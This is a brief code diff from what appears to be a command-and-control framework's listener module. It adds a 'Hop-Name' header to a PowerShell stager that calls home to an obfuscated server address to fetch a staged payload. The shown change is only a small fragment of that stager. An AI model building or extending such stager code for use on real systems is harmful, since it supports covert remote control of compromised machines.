@@ -185,6 +185,7 @@ class Listener:
 
             # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
             stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
+            stager += "$wc.Headers.Add('Hop-Name',$hop);"
 
             # Add custom headers if any
             if customHeaders != []:
